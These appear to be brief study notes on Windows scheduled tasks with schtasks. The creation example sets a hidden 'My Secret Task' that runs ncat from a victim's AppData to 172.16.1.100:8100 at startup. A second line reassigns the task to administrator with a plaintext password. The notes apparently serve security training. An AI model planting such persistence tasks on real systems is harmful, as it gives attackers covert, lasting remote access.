What are Scheduled Task?
- Scheduled tasks are an excellent way for administrators to ensure that tasks they want to run regularly happen
- The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually
Display Scheduled Tasks
- View tasks that already exist on our host: 'SCHTASKS /Query /V /FO list'
Create a new scheduled task
- /create - tell it what we are doing
- /sc - set a schedule
- /tn - name
- /tr - action to take
- New Task Creation Example: 'schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"'
Change a Task
- 'schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"'
Delete a Task
- 'schtasks /delete  /tn "My Secret Task" '

